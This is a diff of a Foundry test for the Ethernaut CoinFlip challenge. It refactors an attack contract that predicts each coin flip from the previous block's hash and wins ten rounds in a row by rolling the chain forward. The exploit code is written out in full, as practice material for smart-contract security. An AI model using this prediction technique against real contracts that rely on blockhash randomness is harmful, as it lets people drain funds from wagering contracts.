@@ -2,7 +2,6 @@
 pragma solidity >=0.8.0;
 
 import "forge-std/Test.sol";
-import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
 import "../utils.sol";
 
 interface ICoinFlip {
@@ -10,27 +9,35 @@ interface ICoinFlip {
 }
 
 contract CoinFlipAttack {
-  using SafeMath for uint256;
-
-  ICoinFlip internal coinflipContract;
-  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+  ICoinFlip internal coinFlipContract;
+  // FACTOR is not public, we have to define it here.
+  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+  uint blockValue;
+  uint coinFlip;
+  bool side;
 
   constructor(address _victim) {
-    coinflipContract = ICoinFlip(_victim);
+    coinFlipContract = ICoinFlip(_victim);
   }
 
-  function attack() public {
-    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-    uint256 coinflip = uint256(uint256(blockValue).div(FACTOR));
-    bool side = coinflip == 1 ? true : false;
+  function attack(Vm vm) public {
+    // we need to be right 10 times in order to beat the level.
+    for (uint i = 0; i < 10; i++) {
+      // compute our "guess" in advance.
+      blockValue = uint256(blockhash(block.number - 1));
+      coinFlip = blockValue / FACTOR;
+      side = coinFlip == 1 ? true : false;
 
-    coinflipContract.flip(side);
+      // we flip and give our "guess".
+      coinFlipContract.flip(side);
+
+      // let's move to the next block.
+      vm.roll(block.number + 1);
+    }
   }
 }
 
 contract CoinFlipTest is Test {
-  using SafeMath for uint256;
-
   address internal challengeAddress;
   CoinFlipAttack internal attackContract;
 
@@ -40,11 +47,8 @@ contract CoinFlipTest is Test {
   }
 
   function testExploit() public {
-    for (uint i = 0; i < 10; i++) {
-      attackContract.attack();
-      vm.roll(block.number.add(1));
-    }
-
+    // pass the vm variable to allow to move forward to the next block.
+    attackContract.attack(vm);
     utils.submitLevelInstance(challengeAddress);
   }
 }
